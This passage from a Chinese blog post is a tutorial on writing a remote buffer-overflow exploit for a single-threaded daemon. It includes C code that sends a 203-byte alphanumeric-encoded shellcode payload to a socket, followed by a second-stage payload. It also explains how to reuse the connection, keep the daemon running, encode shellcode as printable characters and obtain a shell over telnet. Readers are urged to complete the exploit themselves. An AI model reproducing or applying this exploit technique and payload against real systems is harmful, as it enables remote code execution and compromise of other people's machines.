</span></span><span class=line><span class=cl>    <span class=n>SOCKET</span> <span class=n>s</span> <span class=o>=</span> <span class=n>ConnectTo</span><span class=p>(</span><span class=s>&#34;127.0.0.1&#34;</span><span class=p>,</span> <span class=mi>7777</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>send</span><span class=p>(</span><span class=n>s</span><span class=p>,</span> <span class=n>malicious</span><span class=p>,</span> <span class=mi>203</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>  
</span></span><span class=line><span class=cl>    <span class=n>send</span><span class=p>(</span><span class=n>s</span><span class=p>,</span> <span class=s>&#34;</span><span class=se>\xCC\xC3</span><span class=s>&#34;</span><span class=p>,</span><span class=mi>2</span><span class=p>,</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>Sleep</span><span class=p>(</span><span class=o>-</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>WSACleanup</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=p>}</span></span></span></code></pre></td></tr></table></div></div><p>========================和谐的分割线=================================<br>这里直接复用了当前的SOCKET，再次调用recv收了一段shellcode来执行，也就是后面看
到的"\xCC\xC3"。自己再写个简单的shellcode就是，基本没有难度，只是注意要平衡栈，最
后用个0xc3结尾。比较见鬼的是这个守护进程有recv但是没有send，所以shellcode里面你
必须自己找到send的地址……娘西皮，还带这样玩的啊。<br>其他情况下的复用还有一些其他的方法，比如IIS 5这一类的，比如RPC一类的。前者寻
找一个结构，后者hook一个函数，伪造或者搜索一个同时有in和out的opnum，具体细节baidu
上能够搜索到，限于篇幅这里也不再废话了。如果对方是其他完成端口形式，比如ORACLE，只
能暴力点shutdown掉当前监听，自己来监听一个。当然，也有没什么好方法的，比如IIS6。<br>上面的过程省略了没有技术含量的shellcode编写过程，主要说的是一些步骤，方法和技
巧。稳定，复用，还有不挂掉守护进程，都作到了，洗脚盆也成功升级为了棺材匠，还有什么可
以做的呢？<br>美观！这个shellcode简直不是一般的难看，混杂了可读的字符和不可读的字符，简直是
丑陋不堪！你说一个木匠会把棺材做的全是毛刺么，不会雕龙刻凤的木匠永远是二流的。对
于木匠来说，终极的目标是将一个exp发挥到极致，对于这样简单的一个情况，要用所有可见
的字符，最好尽可能都是字母，甚至exp都不用，直接用个telnet就可以溢出获得shell了。<br>不可能么？当然是可能的，人有多大胆地有多大产，钱老还论证过亩产万斤是可行的呢。
那么，还是给个sample。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-4-1><a class=lnlinks href=#hl-4-1> 1</a>
</span><span class=lnt id=hl-4-2><a class=lnlinks href=#hl-4-2> 2</a>
</span><span class=lnt id=hl-4-3><a class=lnlinks href=#hl-4-3> 3</a>
</span><span class=lnt id=hl-4-4><a class=lnlinks href=#hl-4-4> 4</a>
</span><span class=lnt id=hl-4-5><a class=lnlinks href=#hl-4-5> 5</a>
</span><span class=lnt id=hl-4-6><a class=lnlinks href=#hl-4-6> 6</a>
</span><span class=lnt id=hl-4-7><a class=lnlinks href=#hl-4-7> 7</a>
</span><span class=lnt id=hl-4-8><a class=lnlinks href=#hl-4-8> 8</a>
</span><span class=lnt id=hl-4-9><a class=lnlinks href=#hl-4-9> 9</a>
</span><span class=lnt id=hl-4-10><a class=lnlinks href=#hl-4-10>10</a>
</span><span class=lnt id=hl-4-11><a class=lnlinks href=#hl-4-11>11</a>
</span><span class=lnt id=hl-4-12><a class=lnlinks href=#hl-4-12>12</a>
</span><span class=lnt id=hl-4-13><a class=lnlinks href=#hl-4-13>13</a>
</span><span class=lnt id=hl-4-14><a class=lnlinks href=#hl-4-14>14</a>
</span><span class=lnt id=hl-4-15><a class=lnlinks href=#hl-4-15>15</a>
</span><span class=lnt id=hl-4-16><a class=lnlinks href=#hl-4-16>16</a>
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c++ data-lang=c++><span class=line><span class=cl><span class=kt>void</span> <span class=nf>main</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>malicious</span><span class=p>[]</span> <span class=o>=</span>  <span class=s>&#34;`aZZZZZZZZZZZZZZZZZZTYXXXXfiAqcYfPAAeiAoHFXZPiAkj&#34;</span>
</span></span><span class=line><span class=cl>            <span class=s>&#34;brIPiAgVbaaPiAckwzOPLiAsloUWPiAZczabPiAVYDahPiARC&#34;</span>
</span></span><span class=line><span class=cl>            <span class=s>&#34;pDXPQlaatHWsaLtUAAAACFiaaPoHHmDahivabowabxANlKjPpp&#34;</span>
</span></span><span class=line><span class=cl>            <span class=s>&#34;ppPfqVfkzppQpBknrFJPPeruDecoOaeNtiPdPpPxSnLpHOoMd&#34;</span>
</span></span><span class=line><span class=cl>            <span class=s>&#34;AAAOA@&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>WSADATA</span> <span class=n>wsaData</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=n>WSAStartup</span><span class=p>(</span><span class=mh>0x0101</span><span class=p>,</span><span class=o>&amp;</span><span class=n>amp</span><span class=p>;</span><span class=n>wsaData</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>SOCKET</span> <span class=n>s</span> <span class=o>=</span> <span class=n>ConnectTo</span><span class=p>(</span><span class=s>&#34;127.0.0.1&#34;</span><span class=p>,</span> <span class=mi>7777</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>send</span><span class=p>(</span><span class=n>s</span><span class=p>,</span> <span class=n>malicious</span><span class=p>,</span> <span class=mi>203</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>  
</span></span><span class=line><span class=cl>    <span class=n>send</span><span class=p>(</span><span class=n>s</span><span class=p>,</span> <span class=s>&#34;</span><span class=se>\xCC\xC3</span><span class=s>&#34;</span><span class=p>,</span><span class=mi>2</span><span class=p>,</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>Sleep</span><span class=p>(</span><span class=o>-</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>WSACleanup</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=p>}</span>  
</span></span></code></pre></td></tr></table></div></div><pre><code>这里两段shellcode，我们主要解决第一步的问题。要说明malicious到底是个什么东西，
</code></pre><p>牵扯的面就太广了，我们假设看文章的木匠都是有汇编功底的，而且愿意反汇编进去看一下，
就简单的提提，因为要写这个shellcode的构造，那又是一篇文章。shellcode里面首先平衡
栈，然后对栈进行一些patch，patch出想要的指令，然后对后续数据进行解码操作，最后再执
行。<br>这个code，运行顺利可以抓到一个0xCC，也就是第二个send的。但是，ret后守护进程还
是挂了。<br>为了美观，我们exp的工作必须重头再来。开始我们把姿态定得很低，目的是说明问题，
现在把最重要的几步都解决了，又回到了原点，各位木匠们，现在可以动起手来写一下完全符
合可见字符编码的，复用当前SOCKET的第二段shellcode了。按照前面的步骤，应该不是很难
的事情，让守护进程不挂也是可以的，malicious代码保留了革命的火种，发生溢出时的寄存
器值，都保留在上面，剩下一点工作，只是比写普通shellcode稍微多费点劲的活，不想试试看
么。<br>最后再卖个关子，棺材木匠说过，最终是可以由telnet提交的获得shell，连exp都不用的。
telnet是一个字符一个字符提交的，有没有什么一次性提交203个字节导致第一次溢出呢？可
以的，守护进程只有一个线程，打打这方面的主意，用个小技巧吧。<br>-EOF-</p></div><footer class=post-footer><hr><div class=post-copyright><img src=/imgs/cc/cc.svg class=cc-icon width=75 height=75 align=right alt=共享知识 title=共享知识><ul><li class=post-copyright-title><strong>文章标题：</strong>
做一个优秀的木匠</li><li class=post-copyright-author><strong>本文作者： </strong>Rise</li><li class=post-copyright-link><strong>本文链接：</strong>
<a id=post-cr-link href=https://blogs.qipai360.cn/post/be-a-good-carpenter/ title=做一个优秀的木匠>https://blogs.qipai360.cn/post/be-a-good-carpenter/</a></li><li class=post-copyright-license><strong>版权声明： </strong>本作品采用 <i class="fab fa-fw fa-creative-commons"></i><a target=_blank href=https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh-hans>BY-NC-SA</a> 许可协议。转载请注明出处！</li><li><div class=license-icons><a href=https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh-hans target=_blank><img src=/imgs/cc/big/by_nc_sa.svg alt=BY-NC-SA title=BY-NC-SA>
</a><a href=https://notbyai.fyi target=_blank><img src=/imgs/notbyai/zh-hans/black.svg title="Not By AI"></a></div></li></ul></div><div class=followme><span>欢迎关注我的其它发布渠道</span><div class=social-list><div class=social-item><a target=_blank class=social-link href=https://www.zhihu.com/people/rise-worlds><span class=icon><i class="fa fa-book"></i>
</span><span class=label>知乎</span></a></div><div class=social-item><a target=_blank class=social-link href=https://twitter.com/riseworlds><span class=icon><i class="fab fa-twitter"></i>
</span><span class=label>Twitter</span></a></div><div class=social-item><a target=_blank class=social-link href=https://www.facebook.com/rise.worlds><span class=icon><i class="fab fa-facebook"></i>
</span><span class=label>facebook</span></a></div><div class=social-item><a target=_blank class=social-link href=https://youtube.com/@YiXuan><span class=icon><i class="fab fa-youtube"></i>
</span><span class=label>YouTube</span></a></div><div class=social-item><a target=_blank class=social-link href=https://instagram.com/rise.worlds><span class=icon><i class="fab fa-instagram"></i>
</span><span class=label>Instagram</span></a></div><div class=social-item><a target=_blank class=social-link href=https://t.me/riseworlds><span class=icon><i class="fab fa-telegram"></i>
</span><span class=label>Telegram</span></a></div></div></div><div class=post-nav><div class="post-nav-next post-nav-item"><a href=/post/d3d-render-to-texture/ rel=next title=D3D中的渲染到纹理><i class="fa fa-chevron-left"></i> D3D中的渲染到纹理</a></div><div class="post-nav-prev post-nav-item"><a href=/post/game-version-comparison-algorithm/ rel=prev title=游戏版本比较的算法[ZZ]>游戏版本比较的算法[ZZ]
<i class="fa fa-chevron-right"></i></a></div></div></footer></article></div><div id=comments class=post-comments><div class=comment-head><div class=comment-headline><i class="fas fa-comments fa-fw"></i>
<span>评论交流</span></div></div><div class=comment-wrap><div><div class=comment-loading><i class="fa fa-sync fa-spin"></i></div><div class=giscus-container></div></div></div></div></div></main><footer class=footer><div class=footer-inner><div class=copyright>&copy;
<span itemprop=copyrightYear>2004 - 2025
</span><span class=with-love><i class="fa fa-heart"></i>
</span><span class=author itemprop=copyrightHolder>Rise</span></div><div class=powered-by>由 <a href=https://gohugo.io title=0.152.2 target=_blank>Hugo</a> & <a href=https://github.com/hugo-next/hugo-theme-next title=4.8.3 target=_blank>Hugo NexT.Gemini</a> 强力驱动</div><div class=beian><a href=https://beian.miit.gov.cn target=_blank>豫ICP备2021009490号</a>
<img src=/imgs/gongan.png alt=豫公网安备>
<a href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=41162302000074" target=_blank>豫公网安备 41162302000074 号</a></div></div></footer><script class=next-config data-name=page type=application/json>{"clipboard":{"js":{"alias":"clipboard","file":"dist/clipboard.min.js","name":"clipboard.js","version":"2.0.11"}},"comments":true,"expired":false,"isHome":false,"isPage":true,"path":"be-a-good-carpenter","permalink":"https://blogs.qipai360.cn/post/be-a-good-carpenter/","title":"做一个优秀的木匠","toc":false,"waline3":{"pagecnt":{"alias":"@waline/client","alias_name":"waline","file":"dist/pageview.js","name":"pageview","version":"3.5.7"}}}</script><script type=text/javascript src=https://blogs.qipai360.cn/js/3rd/animejs/3.2.2/anime.min.js crossorigin=anonymous defer></script><script type=text/javascript src=https://blogs.qipai360.cn/js/3rd/viewerjs/1.11.6/viewer.min.js crossorigin=anonymous defer></script><script class=next-config data-name=main type=application/json>{"bookmark":{"color":"#222","enable":true,"save":"manual"},"copybtn":true,"darkmode":true,"giscus":{"cfg":{"category":"Announcements","categoryid":"DIC_kwDOA6L0YM4CiXf9","emit":false,"inputposition":"top","mapping":"title","reactions":false,"repo":"rise-worlds/rise-worlds.github.io","repoid":"MDEwOlJlcG9zaXRvcnk2MTAxMTA0MA==","theme":"transparent_dark"},"js":"https://giscus.app/client.js"},"hostname":"https://blogs.qipai360.cn/","i18n":{"ds_day":" 天前","ds_days":" 天 ","ds_hour":" 小时前","ds_hours":" 小时 ","ds_just":"刚刚","ds_min":" 分钟前","ds_mins":" 分钟","ds_month":" 个月前","ds_years":" 年 ","empty":"没有找到任何搜索结果：${query}","hits":"找到 ${hits} 个搜索结果","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","placeholder":"搜索..."},"isMultiLang":false,"lang":"zh-CN","lazyload":false,"motion":{"async":true,"enable":true,"transition":{"collheader":"fadeInLeft","postblock":"fadeIn","postbody":"fadeInDown","postheader":"fadeInDown","sidebar":"fadeInUp"}},"postmeta":{"comments":{"enable":false,"plugin":"waline3"},"views":{"enable":true,"plugin":"waline3"}},"root":"/","scheme":"Gemini","share":{"addtoany":{"js":"https://static.addtoany.com/menu/page.js","locale":"zh-CN","num":8},"enable":false},"sidebar":{"display":"post","offset":12,"padding":18,"position":"left","width":256},"vendor":{"plugins":"local","router":{"name":"local","type":"modern","url":"https://blogs.qipai360.cn/js/3rd"}},"version":"4.8.3","waline3":{"cfg":{"emoji":false,"imguploader":false,"placeholder":"请文明发言哟 ヾ(≧▽≦*)o 可用快捷键选取表情符号：😀😄😁🥳👻👽👀🚄 (Window系统：Win+.，Mac系统：Control+Command+Space)","reaction":true,"reactiontext":["点赞","踩一下","得意","不屑","尴尬","睡觉"],"reactiontitle":"你认为这篇文章怎么样？","requiredmeta":["nick","mail"],"search":true,"serverurl":"https://walinejs.comment.lithub.cc","sofa":"快来发表你的意见吧 (≧∀≦)ゞ","wordlimit":200},"css":{"alias":"@waline/client","file":"dist/waline.css","name":"waline","version":"3.5.7"},"js":{"alias":"@waline/client","file":"dist/waline.js","name":"waline","version":"3.5.7"}}}</script><script type=text/javascript src="/js/main.min.js?=1761990624" defer></script><script type=text/javascript src="/js/clipboard.min.js?=1761990626" defer></script></body></html>